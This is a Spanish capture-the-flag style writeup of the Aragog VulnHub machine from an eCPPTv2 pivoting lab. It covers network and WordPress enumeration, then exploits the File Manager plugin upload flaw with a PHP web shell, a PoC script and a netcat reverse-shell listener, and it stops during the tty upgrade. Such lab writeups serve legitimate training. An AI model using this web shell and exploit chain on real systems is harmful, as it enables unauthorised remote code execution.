---
title: "Simulación del examen eCPPTv2"
date: 2024-06-14 01:32:02 - 5000
categories: [VulnHub]
tags: [VulnHub, eCPPTv2]
image: /assets/img/posts/2024/VulnHub/eCPPTv2/ecppt_logo.jpg
alt: "Image alt text"
description: Writeup del Laboratorio de Pivoting de S4vitar
render_with_liquid: false
---
# Despliegue del Laboratorio

Esta documentación consiste de un writeup del [Laboratorio de Pivoting de S4vitar](https://www.youtube.com/watch?v=Q7UeWILja-g). El laboratorio consta de 6 máquinas:
1. [Aragog](https://www.vulnhub.com/entry/harrypotter-aragog-102,688/)
2. [Nagini](https://www.vulnhub.com/entry/harrypotter-nagini,689/)
3. [Fawkes](https://www.vulnhub.com/entry/harrypotter-fawkes,686/)
4. [Dumbledore](https://archive.org/search?query=windows7+x64)
5. [Matrix](https://www.vulnhub.com/entry/matrix-1,259/)
6. [Brainpan](https://www.vulnhub.com/entry/brainpan-1,51/)

En la siguiente imagen, se muestra un diagrama de cómo están interconectadas estas máquinas.
![Pivoting Lab](/assets/img/posts/2024/VulnHub/eCPPTv2/pivoting_lab.png)
<!-- ![Pivoting Lab](/assets/img/posts/2024/VulnHub/eCPPTv2/Machines/1. Aragog/1. arp-scan.png) -->

# Resolución del Laboratorio
## Máquina Aragog
- Identificar la dirección IP de la máquina Aragog a través de la herramienta `arp-scan`.

```console
❯ arp-scan -I enp0s3 --localnet --ignoredups
Interface: enp0s3, type: EN10MB, MAC: 08:00:27:0f:73:58, IPv4: 192.168.18.53
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.18.1    98:44:ce:be:83:fd       HUAWEI TECHNOLOGIES CO.,LTD
192.168.18.12   88:c3:97:62:e9:00       Beijing Xiaomi Mobile Software Co., Ltd
192.168.18.67   8c:17:59:cc:a5:ab       Intel Corporate
192.168.18.116  8c:17:59:cc:a5:ab       Intel Corporate
192.168.18.30   8c:aa:ce:61:2f:85       Xiaomi Communications Co Ltd
192.168.18.91   50:98:39:68:ac:db       Xiaomi Communications Co Ltd
192.168.18.120  80:5b:65:3f:d9:c2       LG Innotek
192.168.18.249  48:78:5e:e2:06:48       Amazon Technologies Inc.
192.168.18.170  28:39:26:c3:1f:0b       CyberTAN Technology Inc.
192.168.18.243  7e:a5:e5:40:96:76       (Unknown: locally administered)

11 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.961 seconds (130.55 hosts/sec). 10 responded
```
- Ejecutar un escaneo del tipo `TCP SYN` con `nmap` para identificar todos los puertos abiertos.

```console
❯ nmap -sS --open --min-rate 5000 -vvv -n -Pn 192.168.18.67 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-02 18:06 -05
Initiating ARP Ping Scan at 18:06
Scanning 192.168.18.67 [1 port]
Completed ARP Ping Scan at 18:06, 0.03s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 18:06
Scanning 192.168.18.67 [1000 ports]
Discovered open port 80/tcp on 192.168.18.67
Discovered open port 22/tcp on 192.168.18.67
Completed SYN Stealth Scan at 18:06, 0.11s elapsed (1000 total ports)
Nmap scan report for 192.168.18.67
Host is up, received arp-response (0.00096s latency).
Scanned at 2024-07-02 18:06:34 -05 for 0s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 8C:17:59:CC:A5:AB (Intel Corporate)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.24 seconds
           Raw packets sent: 1001 (44.028KB) | Rcvd: 1001 (40.036KB)
```
- Identificar los servicios y las versiones eejcutándose en los puertos abiertos.

```console
❯ nmap -sCV -p22,80 192.168.18.67 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-02 18:07 -05
Nmap scan report for 192.168.18.67
Host is up (0.0010s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 48:df:48:37:25:94:c4:74:6b:2c:62:73:bf:b4:9f:a9 (RSA)
|   256 1e:34:18:17:5e:17:95:8f:70:2f:80:a6:d5:b4:17:3e (ECDSA)
|_  256 3e:79:5f:55:55:3b:12:75:96:b4:3e:e3:83:7a:54:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 8C:17:59:CC:A5:AB (Intel Corporate)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.74 seconds
```
- Accedemos a través de un navegador a la página web.
![Pivoting Lab](/assets/img/posts/2024/VulnHub/eCPPTv2/Machines/1. Aragog/4. web.png)
- No existe información alguna de interés en el código fuente. Realizamos una enumeración de directorios `gobuster`.
```console
❯ gobuster dir -u http://192.168.18.67 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 50 -x php,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.18.67
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/blog                 (Status: 301) [Size: 313] [--> http://192.168.18.67/blog/]
/javascript           (Status: 301) [Size: 319] [--> http://192.168.18.67/javascript/]
/.php                 (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
Progress: 919274 / 3821502 (24.06%)
```
- Al tratar de acceder al directorio `blog`, se puede observar que se realizan consultas a un dominio que no existe. Procedemos a agregarlo en el archivo `/etc/hosts`.
```console
# Host addresses
127.0.0.1  localhost
127.0.1.1  parrot
::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters
# Others
192.168.18.67   wordpress.aragog.hogwarts
```
- Procedemos a enumerar posibles plugins vulnerables en WordPress con `wpscan`. Para realizar un escaneo más agresivo, utilizar un [API token](https://wpscan.com/register/).

```console
❯ wpscan --url http://192.168.18.67/blog/ --enumerate u,vp --plugins-detection aggressive --api-token=$WPSCAN
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.18.67/blog/ [192.168.18.67]
[+] Started: Tue Jul  2 18:53:42 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.38 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.18.67/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.18.67/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.18.67/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.0.12 identified (Insecure, released on 2021-04-15).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://192.168.18.67/blog/, Match: '-release.min.js?ver=5.0.12'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://192.168.18.67/blog/, Match: 'WordPress 5.0.12'
 |
 | [!] 37 vulnerabilities identified:
 |
 | [!] Title: WordPress 3.7 to 5.7.1 - Object Injection in PHPMailer
 |     Fixed in: 5.0.13
 |     References:
 |      - https://wpscan.com/vulnerability/4cd46653-4470-40ff-8aac-318bee2f998d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-36326
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19296
 |      - https://github.com/WordPress/WordPress/commit/267061c9595fedd321582d14c21ec9e7da2dcf62
 |      - https://wordpress.org/news/2021/05/wordpress-5-7-2-security-release/
 |      - https://github.com/PHPMailer/PHPMailer/commit/e2e07a355ee8ff36aba21d0242c5950c56e4c6f9
 |      - https://www.wordfence.com/blog/2021/05/wordpress-5-7-2-security-release-what-you-need-to-know/
 |      - https://www.youtube.com/watch?v=HaW15aMzBUM
 |
 | [!] Title: WordPress < 5.8 - Plugin Confusion
 |     Fixed in: 5.8
 |     References:
 |      - https://wpscan.com/vulnerability/95e01006-84e4-4e95-b5d7-68ea7b5aa1a8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44223
 |      - https://vavkamil.cz/2021/11/25/wordpress-plugin-confusion-update-can-get-you-pwned/
 |
 | [!] Title: WordPress < 5.8.3 - SQL Injection via WP_Query
 |     Fixed in: 5.0.15
 |     References:
 |      - https://wpscan.com/vulnerability/7f768bcf-ed33-4b22-b432-d1e7f95c1317
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21661
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-6676-cqfm-gw84
 |      - https://hackerone.com/reports/1378209
 |
 | [!] Title: WordPress < 5.8.3 - Author+ Stored XSS via Post Slugs
 |     Fixed in: 5.0.15
 |     References:
 |      - https://wpscan.com/vulnerability/dc6f04c2-7bf2-4a07-92b5-dd197e4d94c8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21662
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-699q-3hj9-889w
 |      - https://hackerone.com/reports/425342
 |      - https://blog.sonarsource.com/wordpress-stored-xss-vulnerability
 |
 | [!] Title: WordPress 4.1-5.8.2 - SQL Injection via WP_Meta_Query
 |     Fixed in: 5.0.15
 |     References:
 |      - https://wpscan.com/vulnerability/24462ac4-7959-4575-97aa-a6dcceeae722
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21664
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-jp3p-gw8h-6x86
 |
 | [!] Title: WordPress < 5.8.3 - Super Admin Object Injection in Multisites
 |     Fixed in: 5.0.15
 |     References:
 |      - https://wpscan.com/vulnerability/008c21ab-3d7e-4d97-b6c3-db9d83f390a7
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21663
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-jmmq-m8p8-332h
 |      - https://hackerone.com/reports/541469
 |
 | [!] Title: WordPress < 5.9.2 - Prototype Pollution in jQuery
 |     Fixed in: 5.0.16
 |     References:
 |      - https://wpscan.com/vulnerability/1ac912c1-5e29-41ac-8f76-a062de254c09
 |      - https://wordpress.org/news/2022/03/wordpress-5-9-2-security-maintenance-release/
 |
 | [!] Title: WP < 6.0.2 - Reflected Cross-Site Scripting
 |     Fixed in: 5.0.17
 |     References:
 |      - https://wpscan.com/vulnerability/622893b0-c2c4-4ee7-9fa1-4cecef6e36be
 |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/
 |
 | [!] Title: WP < 6.0.2 - Authenticated Stored Cross-Site Scripting
 |     Fixed in: 5.0.17
 |     References:
 |      - https://wpscan.com/vulnerability/3b1573d4-06b4-442b-bad5-872753118ee0
 |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/
 |
 | [!] Title: WP < 6.0.2 - SQLi via Link API
 |     Fixed in: 5.0.17
 |     References:
 |      - https://wpscan.com/vulnerability/601b0bf9-fed2-4675-aec7-fed3156a022f
 |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via wp-mail.php
 |     Fixed in: 5.0.18
 |     References:
 |      - https://wpscan.com/vulnerability/713bdc8b-ab7c-46d7-9847-305344a579c4
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/abf236fdaf94455e7bc6e30980cf70401003e283
 |
 | [!] Title: WP < 6.0.3 - Open Redirect via wp_nonce_ays
 |     Fixed in: 5.0.18
 |     References:
 |      - https://wpscan.com/vulnerability/926cd097-b36f-4d26-9c51-0dfab11c301b
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/506eee125953deb658307bb3005417cb83f32095
 |
 | [!] Title: WP < 6.0.3 - Email Address Disclosure via wp-mail.php
 |     Fixed in: 5.0.18
 |     References:
 |      - https://wpscan.com/vulnerability/c5675b59-4b1d-4f64-9876-068e05145431
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/5fcdee1b4d72f1150b7b762ef5fb39ab288c8d44
 |
 | [!] Title: WP < 6.0.3 - Reflected XSS via SQLi in Media Library
 |     Fixed in: 5.0.18
 |     References:
 |      - https://wpscan.com/vulnerability/cfd8b50d-16aa-4319-9c2d-b227365c2156
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/8836d4682264e8030067e07f2f953a0f66cb76cc
 |
 | [!] Title: WP < 6.0.3 - CSRF in wp-trackback.php
 |     Fixed in: 5.0.18
 |     References:
 |      - https://wpscan.com/vulnerability/b60a6557-ae78-465c-95bc-a78cf74a6dd0
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/a4f9ca17fae0b7d97ff807a3c234cf219810fae0
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via the Customizer
 |     Fixed in: 5.0.18
 |     References:
 |      - https://wpscan.com/vulnerability/2787684c-aaef-4171-95b4-ee5048c74218
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/2ca28e49fc489a9bb3c9c9c0d8907a033fe056ef
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via Comment Editing
 |     Fixed in: 5.0.18
 |     References:
 |      - https://wpscan.com/vulnerability/02d76d8e-9558-41a5-bdb6-3957dc31563b
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/89c8f7919460c31c0f259453b4ffb63fde9fa955
 |
 | [!] Title: WP < 6.0.3 - Content from Multipart Emails Leaked
 |     Fixed in: 5.0.18
 |     References:
 |      - https://wpscan.com/vulnerability/3f707e05-25f0-4566-88ed-d8d0aff3a872
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/3765886b4903b319764490d4ad5905bc5c310ef8
 |
 | [!] Title: WP < 6.0.3 - SQLi in WP_Date_Query
 |     Fixed in: 5.0.18
 |     References:
 |      - https://wpscan.com/vulnerability/1da03338-557f-4cb6-9a65-3379df4cce47
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/d815d2e8b2a7c2be6694b49276ba3eee5166c21f
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via RSS Widget
 |     Fixed in: 5.0.18
 |     References:
 |      - https://wpscan.com/vulnerability/58d131f5-f376-4679-b604-2b888de71c5b
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/929cf3cb9580636f1ae3fe944b8faf8cca420492
 |
 | [!] Title: WP < 6.0.3 - Data Exposure via REST Terms/Tags Endpoint
 |     Fixed in: 5.0.18
 |     References:
 |      - https://wpscan.com/vulnerability/b27a8711-a0c0-4996-bd6a-01734702913e
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/ebaac57a9ac0174485c65de3d32ea56de2330d8e
 |
 | [!] Title: WP < 6.0.3 - Multiple Stored XSS via Gutenberg
 |     Fixed in: 5.0.18
 |     References:
 |      - https://wpscan.com/vulnerability/f513c8f6-2e1c-45ae-8a58-36b6518e2aa9
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/gutenberg/pull/45045/files
 |
 | [!] Title: WP <= 6.2 - Unauthenticated Blind SSRF via DNS Rebinding
 |     References:
 |      - https://wpscan.com/vulnerability/c8814e6e-78b3-4f63-a1d3-6906a84c1f11
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3590
 |      - https://blog.sonarsource.com/wordpress-core-unauthenticated-blind-ssrf/
 |
 | [!] Title: WP < 6.2.1 - Directory Traversal via Translation Files
 |     Fixed in: 5.0.19
 |     References:
 |      - https://wpscan.com/vulnerability/2999613a-b8c8-4ec0-9164-5dfe63adf6e6
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-2745
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.2.1 - Thumbnail Image Update via CSRF
 |     Fixed in: 5.0.19
 |     References:
 |      - https://wpscan.com/vulnerability/a03d744a-9839-4167-a356-3e7da0f1d532
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.2.1 - Contributor+ Stored XSS via Open Embed Auto Discovery
 |     Fixed in: 5.0.19
 |     References:
 |      - https://wpscan.com/vulnerability/3b574451-2852-4789-bc19-d5cc39948db5
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.2.2 - Shortcode Execution in User Generated Data
 |     Fixed in: 5.0.19
 |     References:
 |      - https://wpscan.com/vulnerability/ef289d46-ea83-4fa5-b003-0352c690fd89
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-2-security-release/
 |
 | [!] Title: WP < 6.2.1 - Contributor+ Content Injection
 |     Fixed in: 5.0.19
 |     References:
 |      - https://wpscan.com/vulnerability/1527ebdb-18bc-4f9d-9c20-8d729a628670
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.3.2 - Denial of Service via Cache Poisoning
 |     Fixed in: 5.0.20
 |     References:
 |      - https://wpscan.com/vulnerability/6d80e09d-34d5-4fda-81cb-e703d0e56e4f
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WP < 6.3.2 - Subscriber+ Arbitrary Shortcode Execution
 |     Fixed in: 5.0.20
 |     References:
 |      - https://wpscan.com/vulnerability/3615aea0-90aa-4f9a-9792-078a90af7f59
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WP < 6.3.2 - Contributor+ Comment Disclosure
 |     Fixed in: 5.0.20
 |     References:
 |      - https://wpscan.com/vulnerability/d35b2a3d-9b41-4b4f-8e87-1b8ccb370b9f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-39999
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WP < 6.3.2 - Unauthenticated Post Author Email Disclosure
 |     Fixed in: 5.0.20
 |     References:
 |      - https://wpscan.com/vulnerability/19380917-4c27-4095-abf1-eba6f913b441
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-5561
 |      - https://wpscan.com/blog/email-leak-oracle-vulnerability-addressed-in-wordpress-6-3-2/
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WordPress < 6.4.3 - Deserialization of Untrusted Data
 |     Fixed in: 5.0.21
 |     References:
 |      - https://wpscan.com/vulnerability/5e9804e5-bbd4-4836-a5f0-b4388cc39225
 |      - https://wordpress.org/news/2024/01/wordpress-6-4-3-maintenance-and-security-release/
 |
 | [!] Title: WordPress < 6.4.3 - Admin+ PHP File Upload
 |     Fixed in: 5.0.21
 |     References:
 |      - https://wpscan.com/vulnerability/a8e12fbe-c70b-4078-9015-cf57a05bdd4a
 |      - https://wordpress.org/news/2024/01/wordpress-6-4-3-maintenance-and-security-release/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Stored XSS in HTML API
 |     Fixed in: 5.0.22
 |     References:
 |      - https://wpscan.com/vulnerability/2c63f136-4c1f-4093-9a8c-5e51f19eae28
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Stored XSS in Template-Part Block
 |     Fixed in: 5.0.22
 |     References:
 |      - https://wpscan.com/vulnerability/7c448f6d-4531-4757-bff0-be9e3220bbbb
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Path Traversal in Template-Part Block
 |     Fixed in: 5.0.22
 |     References:
 |      - https://wpscan.com/vulnerability/36232787-754a-4234-83d6-6ded5e80251c
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/

[i] The main theme could not be detected.

[+] Enumerating Vulnerable Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:00:08 <======================================> (7343 / 7343) 100.00% Time: 00:00:08
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://192.168.18.67/blog/wp-content/plugins/akismet/
 | Latest Version: 5.3.2
 | Last Updated: 2024-05-31T16:57:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.18.67/blog/wp-content/plugins/akismet/, status: 500
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)
 |     Fixed in: 3.1.5
 |     References:
 |      - https://wpscan.com/vulnerability/1a2f3094-5970-4251-9ed0-ec595a0cd26c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9357
 |      - http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/
 |      - https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html
 |
 | The version could not be determined.

[+] wp-file-manager
 | Location: http://192.168.18.67/blog/wp-content/plugins/wp-file-manager/
 | Last Updated: 2024-06-07T05:34:00.000Z
 | Readme: http://192.168.18.67/blog/wp-content/plugins/wp-file-manager/readme.txt
 | [!] The version is out of date, the latest version is 7.2.9
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.18.67/blog/wp-content/plugins/wp-file-manager/, status: 200
 |
 | [!] 7 vulnerabilities identified:
 |
 | [!] Title: File Manager < 6.5 - Backup File Directory Listing
 |     Fixed in: 6.5
 |     References:
 |      - https://wpscan.com/vulnerability/49533dc2-17cb-459c-af28-69a7b9b9512f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-24312
 |      - https://zeroaptitude.com/zerodetail/wordpress-plugin-bug-hunting-part-1/
 |      - https://plugins.trac.wordpress.org/changeset/2326268/wp-file-manager
 |
 | [!] Title: File Manager 6.0-6.9 - Unauthenticated Arbitrary File Upload leading to RCE
 |     Fixed in: 6.9
 |     References:
 |      - https://wpscan.com/vulnerability/e528ae38-72f0-49ff-9878-922eff59ace9
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25213
 |      - https://blog.nintechnet.com/critical-zero-day-vulnerability-fixed-in-wordpress-file-manager-700000-installations/
 |      - https://www.wordfence.com/blog/2020/09/700000-wordpress-users-affected-by-zero-day-vulnerability-in-file-manager-plugin/
 |      - https://seravo.com/blog/0-day-vulnerability-in-wp-file-manager/
 |      - https://blog.sucuri.net/2020/09/critical-vulnerability-file-manager-affecting-700k-wordpress-websites.html
 |      - https://twitter.com/w4fz5uck5/status/1298402173554958338
 |
 | [!] Title: WP File Manager < 7.1 - Reflected Cross-Site Scripting (XSS)
 |     Fixed in: 7.1
 |     References:
 |      - https://wpscan.com/vulnerability/1cf3d256-cf4b-4d1f-9ed8-e2cc6392d8d8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24177
 |      - https://n4nj0.github.io/advisories/wordpress-plugin-wp-file-manager-i/
 |      - https://plugins.trac.wordpress.org/changeset/2476829/
 |
 | [!] Title: File Manager < 7.2.2 - Sensitive Information Exposure via Backup Filenames
 |     Fixed in: 7.2.2
 |     References:
 |      - https://wpscan.com/vulnerability/e1b4077a-2b56-4fd9-9a19-d758dacb08a4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-0761
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/1928f8e4-8bbe-4a3f-8284-aa12ca2f5176
 |
 | [!] Title: File Manager And File Manager Pro (Multiple Versions) - Directory Traversal
 |     Fixed in: 7.2.2
 |     References:
 |      - https://wpscan.com/vulnerability/e04c3f89-55c7-4d8c-9a11-a16cc64079e9
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-6825
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/93f377a1-2c33-4dd7-8fd6-190d9148e804
 |
 | [!] Title: File Manager < 7.2.5 - Cross-Site Request Forgery to Local JS File Inclusion
 |     Fixed in: 7.2.5
 |     References:
 |      - https://wpscan.com/vulnerability/fd0ed716-1e6b-4fcc-a5b4-cf03d07857e6
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-1538
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/57cc15a6-2cf5-481f-bb81-ada48aa74009
 |
 | [!] Title: File Manager < 7.2.6 - Authenticated (Administrator+) Directory Traversal
 |     Fixed in: 7.2.6
 |     References:
 |      - https://wpscan.com/vulnerability/4acb0a40-1f56-4489-9432-3475ff753c45
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-2654
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/ca98fbc6-8cfa-4997-8a46-344afb75a97e
 |
 | Version: 6.0 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.18.67/blog/wp-content/plugins/wp-file-manager/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.18.67/blog/wp-content/plugins/wp-file-manager/readme.txt

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <==========================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] wp-admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 3
 | Requests Remaining: 22

[+] Finished: Tue Jul  2 18:54:15 2024
[+] Requests Done: 7368
[+] Cached Requests: 44
[+] Data Sent: 2.028 MB
[+] Data Received: 1.034 MB
[+] Memory used: 199.469 MB
[+] Elapsed time: 00:00:33
```
- Existe una vulnerabilidad del tipo `Unauthenticated Arbitrary File Upload leading to RCE` en el pluging `File Manager`. En el siguiente [enlace](https://wpscan.com/vulnerability/e528ae38-72f0-49ff-9878-922eff59ace9) se comparte una PoC. Para esto, descargamos el script en `Python3` y creamos un archivo llamado `paylod.php` con el siguiente contenido:
```php
<?php
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```
- Ejecutamos el script.
```console
❯ python3 2020-wp-file-manager-v67.py http://192.168.18.67/blog
Just do it... URL: http://192.168.18.67/blog/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php
200
Success!?
http://192.168.18.67/blog/blog/wp-content/plugins/wp-file-manager/lib/php/../files/payload.php
```
- Validamos la ejecución remota de comandos
![Pivoting Lab](/assets/img/posts/2024/VulnHub/eCPPTv2/Machines/1. Aragog/5. rce.png)
- Establecer una `reverse shell` hacia nuestra máquina de atacante.
    - Atacante: Nos ponemos en escucha con `netcat` por el puerto 443.
    ```console
    ❯ nc -nlvp 443
    ```
    - Víctima: Nos enviamos una `reverse shell`.
    ![Pivoting Lab](/assets/img/posts/2024/VulnHub/eCPPTv2/Machines/1. Aragog/6. reverse_shell.png)
- Realizar un tratamiento de la tty.

```console
<ress/wp-content/plugins/wp-file-manager/lib/files$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
<ress/wp-content/plugins/wp-file-manager/lib/files$ ^Z
[1]  + 102180 suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + 102180 continued  nc -nlvp 443
                                     reset xterm
